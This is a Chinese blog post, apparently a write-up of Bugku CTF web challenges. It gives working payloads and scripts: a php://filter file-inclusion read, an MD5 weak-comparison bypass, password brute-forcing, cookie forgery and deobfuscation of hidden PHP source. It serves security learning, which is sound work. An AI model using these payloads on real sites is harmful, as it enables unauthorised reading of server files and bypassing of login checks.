+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">67</span>d709b2b54aa2aa648cf6e87a7114f1</span><br></pre></td></tr></table></figure>
+<p>提交<br><img src="https://img-blog.csdnimg.cn/20191007211514563.png" alt="在这里插入图片描述"></p>
+<h1 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h1><p>看到file参数想到文件包含漏洞，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8005&#x2F;post&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
+<p>返回的就是index.php的源代码的base64编码，解码得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<h1 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h1><p>hackbar用clicks=1000001绕过<br><img src="https://img-blog.csdnimg.cn/20191007230815542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h1><p>一打开网址，发现一串编码</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d41d8<span class="keyword">cd</span>98f00b204e9800998ecf8427ed41d8<span class="keyword">cd</span>98f00b204e9800998ecf8427e</span><br></pre></td></tr></table></figure>
+<p>题目提到备份，url加上index.php.bak，可以得到bak文件，保存下来，打开，得到一段代码，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>审计一下，先将url中?及以后的字符赋给str，然后从第1位开始截取字符串，str_replace将key替换为空，就是删除字符串中的key，parse_str把字符串解析到变量中，因此要双写key（kkeyey1或者kekeyy1都行）。后面就是要key1和key2不相等，但是md5值相等，引用之前的php弱类型知识，构造payload:<code>?kekeyy1[]=1&amp;kekeyy2[]=2</code>或者<br><code>?kekeyy1[]=something&amp;kekeyy2[]=anything</code>或者<br><code>?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</code><br>得到flag：<code>Bugku{OH_YOU_FIND_MY_MOMY}</code></p>
+<h1 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h1><p><img src="https://img-blog.csdnimg.cn/20190928192246621.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190928192226667.png" alt="在这里插入图片描述"><br>根据题目提示，密码爆破，先在框中随意输一个数字，要把变量pwd传过去，然后进行下列设置，然后点击start attack开始爆破。<br><img src="https://img-blog.csdnimg.cn/20190928192351568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>等一会儿就可以爆破出密码13579，输入密码就可以得到flag。</p>
+<h1 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h1><p><img src="https://img-blog.csdnimg.cn/20190928231951267.png" alt="在这里插入图片描述">这么长的以一串数没法算，于是上脚本吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s=requests.Session()</span><br><span class="line">r=s.get(<span class="string">"http://123.206.87.240:8002/qiumingshan/"</span>)</span><br><span class="line">searchObj=re.search(<span class="string">r'^&lt;div&gt;(.+)=\?;&lt;/div&gt;$'</span>,r.text,re.M|re.S)<span class="comment">#re.M|re.S匹配多行或匹配一行</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">"value"</span>:eval(searchObj.group(<span class="number">1</span>))</span><br><span class="line">&#125;</span><br><span class="line">flag=s.post(<span class="string">"http://123.206.87.240:8002/qiumingshan/"</span>,data=data)</span><br><span class="line"><span class="keyword">print</span> (flag.text)</span><br></pre></td></tr></table></figure>
+<p>可能有人会疑惑，为什么要post value值，是因为不断刷新会出现如下提示，<br><img src="https://img-blog.csdnimg.cn/20190928232354686.png" alt="在这里插入图片描述"><br>运行脚本，得到flag<code>Bugku{YOU_DID_IT_BY_SECOND}</code>。</p>
+<h1 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h1><p><img src="https://img-blog.csdnimg.cn/20190928232949394.png" alt="在这里插入图片描述"><br>拿到题目一点思绪也没有，用burp抓包看看，在repeater里面看到了一串base64码，转来看看，<br><img src="https://img-blog.csdnimg.cn/20190928232917309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解出来竟然是<code>跑的还不错，给你flag吧: Njk4NTkx</code><br>感觉没这么简单，果然提交了uncorrect。看了wp，知道要写脚本，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">"http://123.206.87.240:8002/web6/"</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=r.get(url).headers<span class="comment">#因为flag在消息里</span></span><br><span class="line">mid=base64.b64decode(headers[<span class="string">'flag'</span>])</span><br><span class="line">mid=mid.decode()<span class="comment">#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的</span></span><br><span class="line">flag=base64.b64decode(mid.split(<span class="string">':'</span>)[<span class="number">1</span>])<span class="comment">#获得flag后的值</span></span><br><span class="line">data=&#123;<span class="string">"margin"</span>:flag&#125;</span><br><span class="line"><span class="keyword">print</span> (r.post(url,data).text)</span><br></pre></td></tr></table></figure>
+<p>运行程序之后，得到flag。</p>
+<h1 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h1><p>得到一串没有意义的字符串，查看源码没有发现什么</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</span><br></pre></td></tr></table></figure>
+<p>但是url里面好像有base64编码<code>a2V5cy50eHQ=</code>，转一下，得到<code>keys.txt</code><br>把<code>index.php</code>转成base64试试，得到<code>aW5kZXgucGhw</code>，line参数应该是行数，试一下 line=2</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br></pre></td></tr></table></figure>
+<p>试了line=3代码又不一样了，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+<p>一个一个试太麻烦，用脚本来读出index.php的源码</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a=<span class="number">30</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(a):</span><br><span class="line">    url=<span class="string">"http://123.206.87.240:8002/web11/index.php?line="</span>+str(i)+<span class="string">"&amp;filename=aW5kZXgucGhw"</span> </span><br><span class="line">    s=requests.get(url)</span><br><span class="line">    <span class="keyword">print</span> (s.text)</span><br></pre></td></tr></table></figure>
+<p>运行结果即index.php如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$fa = file($file);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析源码，cookies必须满足margin=margin才能访问keys.php，于是用bp抓包，注意url里面是filename=keys.php，keys.php要Base64加密传输，即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&amp;filename&#x3D;a2V5cy5waHA&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191008122607490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h1><p>点进链接，只看到一串<code>never never never give up !!!</code>，查看源码，<br><img src="https://img-blog.csdnimg.cn/20191008123326714.png" alt="在这里插入图片描述"><br>访问1p.html，结果直接跳转到<a href="https://www.bugku.com/" target="_blank" rel="noopener">https://www.bugku.com/</a><br>直接查看1p.html的源码，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;123.206.87.240:8006&#x2F;test&#x2F;1p.html</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">LANGUAGE</span>=<span class="string">"Javascript"</span>&gt;</span></span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> Words =<span class="string">"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span> </span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span><span class="params">()</span></span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> NewWords;</span></span><br><span class="line"><span class="javascript">NewWords = <span class="built_in">unescape</span>(Words);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(NewWords);</span></span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line"><span class="actionscript"><span class="comment">// --&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析源码，Words那一串是url编码之后的数据，<a href="http://web.chacuo.net/charseturlencode" target="_blank" rel="noopener">解码一下</a>，得到一句javascript语句和一大段注释，可以看出注释是经过base64加密的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; </span><br><span class="line">&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ&#x3D;&#x3D;--&gt;</span><br></pre></td></tr></table></figure>
+<p>解码一下，又是一堆url编码后的数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure>
+<p>再解码一次，得到php源码了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";if(!$_GET['id'])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="string">	exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$id=$_GET['id'];</span></span><br><span class="line"><span class="string">$a=$_GET['a'];</span></span><br><span class="line"><span class="string">$b=$_GET['b'];</span></span><br><span class="line"><span class="string">if(stripos($a,'.'))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	echo 'no no no no no no no';</span></span><br><span class="line"><span class="string">	return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$data = @file_get_contents($a,'r');</span></span><br><span class="line"><span class="string">if($data=="</span>bugku is a nice plateform!<span class="string">" and $id==0 and strlen($b)&gt;5 and eregi("</span><span class="number">111</span><span class="string">".substr($b,0,1),"</span><span class="number">1114</span><span class="string">") and substr($b,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	require("</span>f4l2a3g.txt<span class="string">");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	print "</span>never never never give up !!!<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>不和它玩了，直接访问<code>http://123.206.87.240:8006/test/f4l2a3g.txt</code>就完事</p>
+
+    </div>
+
+    
+    
+    
+
+	<div>
+		
+			<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+		
+	</div>
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+
+                <span class="label">RSS</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/03/CTF%20WP/JACTF%20misc%20wp/" rel="prev" title="JACTF misc wp">
+      <i class="fa fa-chevron-left"></i> JACTF misc wp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/02/03/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/" rel="next" title="SQL注入">
+      SQL注入 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
